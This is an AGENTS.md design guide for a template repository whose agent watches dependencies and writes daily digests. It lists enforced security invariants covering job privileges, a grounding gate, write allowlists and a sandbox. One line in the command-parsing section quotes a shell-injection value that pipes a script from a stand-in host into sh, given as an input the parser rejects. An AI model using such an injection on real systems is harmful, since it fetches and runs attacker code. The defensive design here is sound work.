# AGENTS.md — the rules this repository is built on

> **Read this before editing anything.** Every rule below is either enforced by a
> check in `.github/workflows/ci.yml` or it is not a rule — it is a preference.
> Rules are listed with the check that enforces them. If you add a feature and a
> check starts failing, the check is right until proven otherwise.

This repository is a **template**. A user clicks "Use this template", sets two or
three repository variables, optionally one secret, and gets an agent that watches
their stack and narrates a daily digest. There is no server, no database, no
front-end build step, and no vendor of ours in the loop.

---

## 0. The one sentence

**The repository is the instance, and git is the only durable store.**

Everything below is a consequence of that. If a change needs a database, a
long-lived process, or an inbound port, it does not belong in this repository.

---

## 1. Invariants

### I1 — One privilege per job

> *No component holds both a secret and a write token.*

A job may hold a secret, or it may hold `contents: write` / `issues: write` /
`pull-requests: write`. It may not hold both. This is why `digest.yml` is one
file with **three** jobs rather than one job with three steps, and why the
containment gate (I2) runs in the job that has no model key.

- **Enforced by:** `lib/invariants.mjs` → `checkOnePrivilegePerJob()`, run in CI.
- **Enforced by:** `lib/invariants.mjs` → `checkNoSecretInSandbox()`.
- **Why it erodes:** it is easy to merge two jobs "just for latency". The merge
  is always a downgrade; the latency is seconds.

### I2 — The gate decides, and the gate cannot be hijacked

> *Every entity in generated prose must appear in the fetched payload.*

"Entity" = `{advisory id, package name, version literal, numeric token}`. Not
just numbers: a hallucinated `GHSA-…` identifier inside a fluent sentence is the
same failure class as an invented version number.

The gate runs **only** in a job that holds no model key (`commit` in
`digest.yml`, `reply` in `ask.yml`). A gate that shares a job with the model is a
gate the model's input can influence.

- **Enforced by:** `lib/gate.mjs`, called from `scripts/commit-step.mjs` and
  `scripts/reply-step.mjs`; unit-tested in `tests/gate.test.mjs`.
- **Hard limit:** the gate is exact and deterministic and must stay that way. A
  paraphrase-tolerant second pass may only ever *queue a sentence for human
  review*. It must never gate a commit.

### I3 — Bounded writes, fail-closed

Only these paths may be written:

| Writer | Allowlist |
|---|---|
| Collector (the pipeline, at runtime) | `data/`, `history/`, `digest/`, `assets/`, `README.md` |
| CI (rendering, at commit time) | the above plus `site/` |

Any unexpected path aborts **before** commit. Enforced inside the writer
(`lib/store.mjs`) and again in CI as a diff check over `git status --porcelain`.

`site/` deliberately appears in the CI allowlist but not the collector's: who may
write what is a separation, not a duplication.

### I4 — Everything is behind the change gate except one file

`writeIfChanged()` compares content before writing. A state file strips its own
timestamp before comparing, so a no-op run does not restamp. Without this, four
runs a day is ~1,460 commits a year of identical files.

**Exactly one file is exempt: `data/heartbeat.json`.** It is always rewritten,
never hashed, never diffed. This is not tidiness — it is the mitigation for the
60-day trap: a broken agent that writes the same failure state twice would commit
nothing, go silent, and have its schedule disabled. `consecutive_failures` moves
monotonically while the agent is broken, so there is no state in which a run
commits nothing.

- **Enforced by:** `lib/store.mjs` (`isGateExempt()`), asserted in
  `tests/store.test.mjs`.

### I5 — Append-only history, hash-chained

`history/runs.jsonl` chains: each row's hash covers the previous row's hash.
Verified on every run; a broken chain fails the run loudly.

Events are **transitions, not snapshots** — `added`, `bumped`, `flagged`,
`cleared`. History is written when semantic state changes, not when the clock
ticks.

Narration is **excluded** from the chain. Prose is generated content, not a fact
about the world; hashing it would make the chain churn on every phrasing tweak.

### I6 — Commands are parsed, never interpreted

The comment body is **never** passed to a model as an instruction. The verb is
matched by regex against an allowlist of eight verbs — seven command shapes, since
`pause` and `resume` are one toggle. The argument is validated against the watch
list in `data/stack.json`. Free text is rejected.

Four rules, all structural, all in `lib/commands.mjs`:

1. **Author gate** — `author_association ∈ {OWNER, MEMBER, COLLABORATOR}`, and an
   **exit**, not a warning.
2. **Grammar, not model** — regex over the allowlist; at most the parsed argument
   reaches a model, and only for `explain`.
3. **Argument validation** — must appear in the watch list. This removes the
   shell-interpolation surface entirely: `"; curl evil.sh | sh` fails the parse,
   it never becomes a command.
4. **Idempotency** — `{comment_id, author, verb, arg, started_at, outcome}` is
   written to `history/commands.jsonl` **before** acting. GitHub permits re-runs
   and users perform them; a re-run must not bump a dependency twice.

### I7 — The sandbox never receives a secret, and ships off by default

The sandbox is a container inside an Actions job. It has no session and cannot
have one, because every Actions job is a fresh VM destroyed at the end of the
run — no attach, no pause, no resume.

- `sandbox.yml` declares `permissions: {}` and receives **no** secrets.
- Child containers run `--network none --read-only --cap-drop ALL
  --security-opt no-new-privileges --user 65534:65534`, with
  `LLM_API_KEY: ""` passed **explicitly empty** so it cannot be inherited.
- Dependencies are installed in the trusted parent **before** the network is cut;
  the prepared workspace is mounted read-only.
- **Enabled by `SANDBOX_ENABLED`, default `false`.** The strongest property in
  this design is that the default instantiation executes no third-party code at
  all.

The self-test is: **if `sudo` works inside the sandbox, the sandbox has already
leaked.** `lib/sandbox.mjs` asserts this on every run.

### I8 — No provider names in the code

The agent must not have an opinion about which endpoint you use, so it must not
contain one. `lib/llm.mjs` takes a base URL and a model name and knows nothing
else. There is **no default endpoint and no fallback**: if no base URL is
configured, the rules-only path (§I9) produces the whole digest and no model is
contacted.

Configuration surface, and nothing more:

| Name | Kind | Value |
|---|---|---|
| `LLM_API_KEY` | secret | the user's own key |
| `JEV_API_KEY` | secret, optional | only when `JEV_ENABLED` is true |
| `LLM_BASE_URL` | variable | any OpenAI-compatible root |
| `LLM_MODEL` | variable | model or deployment name |
| `JEV_ENABLED` | variable | `false` (default) |
| `SANDBOX_ENABLED` | variable | `false` (default) |
| `AGENT_LANG` | variable | reply language, default `en` |

- **Enforced by:** `lib/invariants.mjs` → `checkNoVendorNames()`.

### I9 — The agent is fully useful with no model key

The advisory rules tier in `lib/triage.mjs` is a real implementation, not a
placeholder. `JEV_ENABLED` defaults to `false`. So a user with no key at all
still gets a complete, correct, gated digest — narration is simply the
deterministic template.

Enabling a decision layer **adds** a tier; it never switches providers.

### I10 — The web surface holds no key and calls no model

`site/chat.html` is a **composer, not a client.** It builds a prefilled issue
URL, the user submits it already authenticated, the workflow runs in Actions, and
the reply lands as a comment the page renders on next load.

A page that calls an endpoint directly is rejected for three reasons, each
individually fatal: the key would be public; there is no fetched payload to
validate against, so nothing grounds the answer; and no row is written to
`history/commands.jsonl`, so the answer is unauditable.

**The one thing that must not happen:** the page must never gain a direct route
to execution — no endpoint, no token, no browser-triggered dispatch. A static
page *cannot* trigger a workflow (that needs a token carrying `actions: write`),
so this boundary is enforced by the platform, not by discipline. Keep it that
way.

**Ungrounded answers must be marked, permanently and visibly.** The digest is
verified; "dev help" is not. Rendering them in the same visual style destroys the
property I2 exists to buy.

### I11 — Honesty about time

Scheduled workflows are delayed under load and may be dropped. So a digest is
stamped with the **observation time**, never with the schedule. "As of 06:12 UTC"
is honest; "today's briefing" is a small lie that will eventually be caught.

---

## 2. Layout

```
.github/workflows/   digest (4 jobs) · ask (3 jobs) · act · sandbox · pages · ci
lib/                 the documented five: llm · probe · commands · sandbox · triage
                     plus internals: store · version · gate · sources · render · invariants
scripts/             one entry point per job
data/                state — all behind the gate except heartbeat.json
history/             append-only: events · commands · runs (hash-chained)
digest/              dated archive
site/                index.html (digest view) · chat.html (composer)
README.md            regenerated between markers
```

The five named modules in `lib/` are the documented surface. Everything else in
`lib/` exists to keep them single-purpose.

---

## 3. Local development

```bash
npm test                     # unit tests, no network
npm run check                # invariant checks over the workflows on disk
node scripts/fetch-step.mjs  # dry run; writes .run/payload.json, no commit
```

`fetch` and `narrate` are read-only and safe to run locally. `commit` writes —
run it only in CI unless you know why you are running it.

To run the whole pipeline locally without touching git:

```bash
node scripts/fetch-step.mjs && node scripts/narrate-step.mjs && \
  node -e "import('./lib/gate.mjs').then(async g=>{...})"
```

---

## 4. Adding things

- **A new verb** goes in `lib/commands.mjs` first, with its argument validator,
  then in the reply renderer. If it calls a model, it belongs in the `explain`
  job, not `route`.
- **A new source** goes in `lib/sources.mjs` and must be keyless or already
  authenticated. A source needing a new secret needs a new job, because of I1.
- **A new output surface** must be added to the write allowlist deliberately
  (I3), and must not move the gate out of the keyless job (I2).
- **Do not merge jobs.** See I1.
